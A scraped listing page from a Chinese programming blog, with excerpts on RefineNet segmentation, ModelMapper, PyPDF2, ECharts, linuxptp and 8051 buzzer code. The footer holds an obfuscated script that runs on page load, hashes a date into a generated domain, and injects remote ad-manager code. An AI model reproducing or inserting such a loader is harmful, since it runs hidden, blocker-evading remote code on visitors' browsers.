1.引言 语义分割是图像理解中的一个关键组成部分。任务是为图像中的每个像素分配一个唯一的标签（或类别），可以被视为一种密集分类问题。所谓的对象解析问题通常可以被视为语义分割。最近，深度学习方法，特别是卷积神经网络（CNN），例如VGG [42]、残差网络 [24]，在识别任务中显示出了显著的结果。然而，当涉及到密集预测任务，如密集深度或法线估计 [13,33,34]和语义分割 [36,5]时，这些方法显示出明显的局限性。多个阶段的空间池化和卷积步幅通常会使最终图像预测在每个维度上减少32倍，从而丧失了许多更精细的图像结构。
解决这个限制的一种方法是学习反卷积滤波器作为上采样操作[38,36]，以生成高分辨率的特征图。反卷积操作无法恢复在卷积前向阶段的降采样操作后丢失的低级视觉特征。因此，它们无法输出准确的高分辨率预测。低级视觉信息对于边界或细节的准确预测至关重要。最近由Chen等人提出的DeepLab方法[6]采用了扩张（或膨胀）卷积来考虑更大的感受野，而不对图像进行降采样。DeepLab被广泛应用，并代表了语义分割的最新性能。然而，这种策略至少有两个限制。首先，它需要在通常具有高维特征的大量详细（高分辨率）特征图上进行卷积，这在计算上是昂贵的。而且，大量的高维和高分辨率特征图也需要巨大的GPU内存资源，特别是在训练阶段。这阻碍了高分辨率预测的计算，并且通常将输出大小限制为原始输入的1/8。其次，扩张卷积引入了特征的粗糙子采样，可能导致重要细节的丢失。
另一种方法利用中间层的特征来生成高分辨率的预测，例如[36]中的FCN方法和[22]中的超级像素方法。这些方法的直觉是，中间层的特征被期望描述对象部分的中级表示，同时保留空间信息。这些信息被认为是早期卷积层的特征的补充，早期卷积层的特征编码低级的空间视觉信息，如边缘、角点、圆等，以及深层的高级特征，编码高级语义信息，包括对象或类别级别的证据，但缺乏强的空间信息。
我们认为所有层次的特征对于语义分割都是有帮助的。高级语义特征有助于图像区域的类别识别，而低级视觉特征有助于生成高分辨率预测的清晰、详细的边界。如何有效地利用中间层特征仍然是一个开放的问题，值得更多的关注。为此，我们提出了一种新颖的网络架构，有效地利用多层次特征生成高分辨率的预测。我们的主要贡献如下：
1.我们提出了一个多路径细化网络（RefineNet），它利用多个抽象级别的特征进行高分辨率的语义分割。RefineNet以递归的方式将低分辨率（粗糙的）语义特征与细粒度的低级特征相结合，生成高分辨率的语义特征图。我们的模型具有灵活性，可以轻松地级联和修改。
2.我们的级联RefineNet可以有效地进行端到端的训练，这对于最佳预测性能至关重要。具体而言，RefineNet中的所有组件都使用残差连接[24]和恒等映射[25]，使得梯度可以通过短程和长程残差连接直接传播，从而实现有效和高效的端到端训练。
3.我们提出了一个新的网络组件，称为串联残差池化，它能够从大范围的图像区域中捕获背景上下文。它通过使用多个窗口大小高效地池化特征，并通过残差连接和可学习权重将它们融合在一起。
4.我们提出的RefineNet在包括PASCAL VOC 2012、PASCAL-Context、NYUDv2、SUN-RGBD、Cityscapes、ADE20K和对象解析人体部位数据集在内的7个公共数据集上取得了最新的最佳性能。特别是在PASCAL VOC 2012数据集上，我们的IoU得分达到了83.4，远远超过当前最好的方法DeepLab。
为了促进未来的研究，我们发布了RefineNet的源代码和训练模型。
图1.我们方法在对象解析任务（左）和语义分割（右）上的示例结果。
1.1.相关工作 在近年来，卷积神经网络（CNN）已成为语义分割最成功的方法。早期的方法[18,23]是基于区域提议的方法，通过对区域提议进行分类来生成分割结果。最近，完全卷积网络（FCNN）[36,5,10]展示了有效的特征生成和端到端训练，并因此成为语义分割最受欢迎的选择。FCNN还被广泛应用于其他密集预测任务，例如深度估计[15,13,33]、图像恢复[14]和图像超分辨率[12]。这里提出的方法也基于完全卷积风格的网络。
基于FCNN的方法通常存在低分辨率预测的限制。有许多提出的技术来解决这个限制，并旨在生成高分辨率的预测结果。在[5]中，采用了基于空洞卷积的方法DeepLab-CRF，直接输出中等分辨率的分数图，然后利用颜色对比信息应用密集CRF方法[27]来优化边界。CRF-RNN [47]通过实现循环层来扩展这种方法，以端到端学习密集CRF和FCNN。解卷积方法[38,2]学习解卷积层来上采样低分辨率的预测结果。在[34]中的深度估计方法采用超像素池化来输出高分辨率的预测结果。
存在一些利用中间层特征进行分割的方法。Long等人的FCN方法[36]在中间层添加预测层，以生成多分辨率的预测分数。他们对多分辨率的分数进行平均，生成最终的预测掩码。他们的系统采用阶段性训练而非端到端训练。Hypercolumn方法[22]合并了来自中间层的特征，并学习密集分类层。该方法也采用阶段性训练策略而非端到端训练。SegNet [2]和U-Net [40]都在解卷积架构中应用跳过连接，以利用中间层的特征。
尽管存在一些相关工作，如何有效地利用中间层特征仍然是一个开放的问题。我们提出了一种新颖的网络架构RefineNet来解决这个问题。RefineNet的网络架构与现有方法有所不同。它由一些特别设计的组件组成，能够通过利用低级视觉特征来改进粗糙的高级语义特征。特别是，RefineNet采用了短程和长程的残差连接，并使用恒等映射，实现了整个系统的有效端到端训练，从而帮助实现卓越的性能。全面的实证结果清楚地验证了我们的新颖网络架构在利用中间层特征方面的有效性。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/489fc7ddc1e6fc7f759f6256ce07b3c9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2d80f60dca32284c0257e556d39753f6/" rel="bookmark">
			JessIbuca 插件报错 window.Jessibuca is not a constructor
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如果之前是正常使用的，可以重启下编辑器再次启动项目看看。
或者去Jessibuca官网重新引入最新的代码到public文件下
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a912e9691408071b382dc2b1b0339bc6/" rel="bookmark">
			modelmapper的使用，ModelMapperUtil 工具类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		modelmapper的使用，ModelMapperUtil 工具类 &lt;dependency&gt; &lt;groupId&gt;org.modelmapper&lt;/groupId&gt; &lt;artifactId&gt;modelmapper&lt;/artifactId&gt; &lt;version&gt;3.1.0&lt;/version&gt; &lt;/dependency&gt; ModelMapperUtil工具类
public class ModelMapperUtil { private static final ModelMapper modelMapper; static { modelMapper = new ModelMapper(); modelMapper.getConfiguration().setMatchingStrategy(MatchingStrategies.STRICT); } public static &lt;T, S&gt; T map(S source, T target) throws MappingException { if (ObjectUtil.isNull(source)) { return null; } Assert.notNull(target, "target instance required"); modelMapper.map(source, target); return target; } public static &lt;T, S&gt; T map(S source, Class&lt;T&gt; targetClass) throws MappingException { if (ObjectUtil.isNull(source)) { return null; } Assert.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a912e9691408071b382dc2b1b0339bc6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b25c3062c0b5d989cc2e440ce4576d96/" rel="bookmark">
			「Python-PDF 专栏」通过 PyPDF2 打开并获取PDF的信息
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		通过 PyPDF2 打开并获取PDF的信息 一、PDF 打开文档1. open()函数的功能和用法2. PyPDF2.PdfReader的功能、用法和原理 二、获取 PDF 的各种信息1. 获取 PDF 的总页数2. 获取 PDF 的页面大小3. 获取 PDF 的书签4. 获取 PDF 的作者、主题、创建日期等5. 获取 PDF 的文本 一、PDF 打开文档 导入必要的模块和函数：首先，我们需要导入PyPDF2库，以便能够访问其中的功能。使用以下代码将PyPDF2导入到Python脚本中： import PyPDF2 2.打开PDF文件：使用open()函数，我们可以打开一个PDF文件，并创建一个PDF文件对象，以便后续操作。该函数接受一个文件名或文件对象作为输入参数。例如，如果我们有一个名为"example.pdf"的PDF文件：
# 使用'rb'模式打开文件，表示以二进制模式读取文件 pdf_file = open('example.pdf', 'rb') 在这里，我们使用了二进制模式打开文件，因为PDF文件是二进制文件。
创建PDF阅读器对象：使用PdfReader()函数，我们可以创建一个PDF阅读器对象，用于读取和解析PDF文件内容。 pdf_reader = PyPDF2.PdfReader(pdf_file) 至此，我们已经完成了使用PyPDF2打开PDF文件的过程。然后我们简要说明一下涉及到的各个函数的使用方法和原理：
open()函数：
用于打开文件，返回一个文件对象。第一个参数是文件名或文件路径，第二个参数是文件打开模式（例如，'r’表示读取模式，'w’表示写入模式，'rb’表示以二进制模式读取等）。
PdfReader()函数
-用于创建一个PDF阅读器对象，接受一个文件对象作为输入。该函数会解析PDF文件的结构，并将内容存储在一个数据结构中，以便后续操作。
1. open()函数的功能和用法 open()函数用于打开文件，并返回一个文件对象，以便进行后续的操作。在PyPDF2库中，我们通常使用open()函数来打开PDF文件。
语法：
open(file, mode='r', buffering=-1, encoding=None, errors=None, newline=None, closefd=True, opener=None) 参数说明
file: 要打开的文件名或文件路径。mode: 打开文件的模式。可以是以下值之一： ‘r’: 读取模式 (默认)。‘rb’: 以二进制模式读取。‘w’: 写入模式。‘wb’: 以二进制模式写入。‘a’: 追加模式。‘ab’: 以二进制模式追加。‘x’: 创建一个新文件并写入（如果文件已存在，则抛出FileExistsError异常）。‘xb’: 以二进制模式创建一个新文件并写入。 buffering: 设置缓冲大小。如果为0，则不进行缓冲；如果为1，则进行行缓冲；如果为大于1的整数，则表示缓冲区大小。encoding: 文件的编码方式。errors: 编码错误处理方式。newline: 控制换行符的处理。closefd: 如果为True（默认），则在文件关闭时关闭文件描述符；如果为False，则不关闭文件描述符。opener: 用于打开文件的自定义文件打开器（通常不需要使用）。 使用示例
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b25c3062c0b5d989cc2e440ce4576d96/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a23b6b15d4d051a608067db1eda72836/" rel="bookmark">
			echars力引导关系图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		效果图
力引导关系图
力引导布局是模拟弹簧电荷模型在每两个节点之间添加一个斥力，每条边的两个节点之间添加一个引力，每次迭 代节点会在各个斥力和引力的作用下移动位置，多次迭代后节点会静止在一个受力平衡的位置，达到整个模型的 能量最小化。力引导布局的结果有良好的对称性和局部聚合性。 数据
chartData:{ data:[ { name: 'node1', symbolSize: 50, itemStyle:{ color: '#fac858' } }, { name: 'node2', symbolSize: 30, itemStyle:{ color: '#91cc75' } }, { name: 'node3', symbolSize: 30, itemStyle:{ color: '#91cc75' } }, { name: 'node4', symbolSize: 30, itemStyle:{ color: '#91cc75' } }, { name: 'node5', symbolSize: 30, itemStyle:{ color: '#91cc75' } }, { name: 'node6', symbolSize: 20 }, { name: 'node7', symbolSize: 20 }, { name: 'node8', symbolSize: 20 }, { name: 'node9', symbolSize: 20 }, { name: 'node10', symbolSize: 20 }, { name: 'node11', symbolSize: 20 }, { name: 'node12', symbolSize: 20 }, ], links:[ { source: 'node1', target: 'node2' }, { source: 'node1', target: 'node3' }, { source: 'node1', target: 'node4' }, { source: 'node1', target: 'node5' }, { source: 'node2', target: 'node6' }, { source: 'node2', target: 'node7' }, { source: 'node3', target: 'node8' }, { source: 'node4', target: 'node9' }, { source: 'node5', target: 'node10' }, { source: 'node4', target: 'node11' }, { source: 'node3', target: 'node12' }, ] } Dom
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a23b6b15d4d051a608067db1eda72836/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b24fb82d3280b87b8b689d288fa4952a/" rel="bookmark">
			python 遍历文件夹下的全部MP4文件，并统一备份到指定文件夹下（完整源码，含GUI页面）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		假设这样一个场景，你很想找一个之前很有价值又很重要的PPT，但是你忘记了文件的名字是什么，只知道是一个PPT的文件，你会怎么找？
你是否也有这样的困扰，或者是烦恼，想把一个路径下的全部文件找出来是否困难，尤其是文件夹下面还有很多层级的文件夹，就像俄罗斯套娃一下，一层又一层。
这个时候，你会怎么办？
是进行文件检索？还是一个个文件夹的翻找？还是干脆不找了
正是有过这样的痛苦，或者说是烦恼，所以简单的整理了一套代码，可以开始的在文件中找到全部的指定类型的文件，并统一保存到一个文件夹。（当然，在代码中加一下条件，也可以只查找指定的文件）。 简单的处理逻辑如下：
完整代码如下：
from tkinter import * from tkinter import ttk, messagebox from tkinter import filedialog import os import shutil # 创建Tkinter帧的实例 app = Tk() # 定义几何 app.geometry("950x350") def get_folder(): path = filedialog.askdirectory() str_folder_obj.set(path) def save_folder_path(): path = filedialog.askdirectory() str_save_obj.set(path) def DatToImage(): folder_path = str_folder_obj.get() save_path = str_save_obj.get() if save_path == "" or folder_path == "" or folder_path == "查找位置：" or save_path == "保存位置：": messagebox.showinfo("Alert", "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b24fb82d3280b87b8b689d288fa4952a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3313c4304f99c6038c10c4f4a07c731d/" rel="bookmark">
			剖析Linuxptp中ptp4l实现--OC
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		源码克隆地址：
git://git.code.sf.net/p/linuxptp/code
项目官网文档：
https://linuxptp.nwtime.org/documentation/
关于linuxptp的相关配置可以参考以下博文：
linuxptp/ptp4l PTP时钟同步配置选项
代码剖析 ptp4l的main函数在ptp4l.c中，命令行解析使用的是 getopt_long ，具体使用方法可以百度，这个是现成的命令行解析API。
可以看到解析不同命令行参数后都是调用的 config_set_int 函数设置，linuxptp中配置一般都是保存在 config.c 中的 config_tab 中：
关于配置项所代表的含义可以参考上文推荐的博文。
命令行中比较重要的是 -i ，也就是添加interface：
创建接口使用的是网卡名称，比如 -i eth0，此时就会创建一个名字是eth0的接口，源码如下：
在 interface_create 中注意，除了名字(name)还有ts_label也被设置为传入的网卡名称：
除去配置参数和接口创建，其实功能主体就是创建clock，和轮询创建clock时添加的文件描述符：
在 clock_create 中只看几个关键的地方，第一个是软硬件时间戳相关：
在clock创建的初始你会看到基本都是初始化 c-&gt;dds 这个结构体相关的配置，这里在协议原文中有：
其实dds就是defaultDS，这几个数据集都是协议明文规定的数据集，linuxptp中在ds.h中有所定义，详细内容可以参照协议原文第8章节PTP data sets。
在配置比如使用软件时间戳还是硬件时间戳，是onestep还是twostep时，会先根据设置得到一个网卡预期需要支持的模式，然后根据前面创建的interface，获取网卡的信息，再判断网卡是否支持：
再下面是确定使用哪个PHC(ptp hardware clock)的逻辑：
还有UDS(unix domain sockets)的配置：
剩下的就是clock本身一些杂项初始化，在这个函数末尾有最重要的port添加与初始化：
在添加port的时候，可以看到每个port申请了多少个fd：
从上图可以看到clock的port个数=interface个数+2
从上图可以看到，当没有添加过port的时候port个数是两个uds，每次添加一个port，实际是加了3个port，也就是添加一个port的时候，一共有5个port，每个port有 N_CLOCK_PFD 个文件描述符，这些文件描述符就是后续需要轮询的。N_CLOCK_PFD是12，其中除了包含下面11个fd，还有一个处理错误状态的定时器fd。
回到刚才的函数，port_open中还有一些port的参数设置，其中比较重要的有：
以及通过 transport_create 创建了传输实例：
根据传输类型有UDS/ETHERNET/IPV4/IPV6可选，最终trp就是一组包含发送接收等的函数指针合集：
比如IPV4：
port_open 中还有有限状态机(fsm)的设置：
需要注意，状态机的各种状态也是协议中所明文规定的：
具体内容请参照协议原文9.2.5章节。 再有就是fault定时器也在这里被创建：
回到clock_create函数最后对port的初始化：
根据前面port_open中的源码，假如我们是E2E的OC，那么我们的 port_dispatch 函数是 bc_dispatch ：
在 port_state_update 里我们根据 EV_INITIALIZE 事件对端口进行了初始化：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3313c4304f99c6038c10c4f4a07c731d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d7fb99a88a900bc2eb6ba1388ffa6fd6/" rel="bookmark">
			51单片机学习--蜂鸣器播放音乐
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		由原理图可知，蜂鸣器BEEP与P1_5 相关，但其实这个原理图有错，实测接的是P2_5
下面这个代码就是以500HZ的频率响500ms的例子
sbit Buzzer = P2^5; unsigned char KeyNum; unsigned int i; void main() { while(1) { KeyNum = Key(); if(KeyNum) { for(i = 0; i &lt; 500; i ++) { Buzzer = !Buzzer; Delay(1);// 1ms翻转一次，周期就是2ms,频率就是500HZ } //一共会响500ms } } } 接下来先把这个发出声响的代码封装成Buzzer模块，接下来的目标是实现发出不同音调的声响
先来看用定时器实现的蜂鸣器发生，每次中断就翻转一次Buzzer，中断每1ms执行一次，所以翻转周期是2ms，音调一样
#include &lt;REGX52.H&gt; #include "Timer0.h" #include "Delay.h" sbit Buzzer = P2^5; void main() { Timer0_Init(); while(1) { } } void Timer0_Routine() interrupt 1 { TL0 = 0x66;	//设置定时初值 TH0 = 0xFC;	//设置定时初值 Buzzer = !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d7fb99a88a900bc2eb6ba1388ffa6fd6/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/105/">«</a>
	<span class="pagination__item pagination__item--current">106/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/107/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>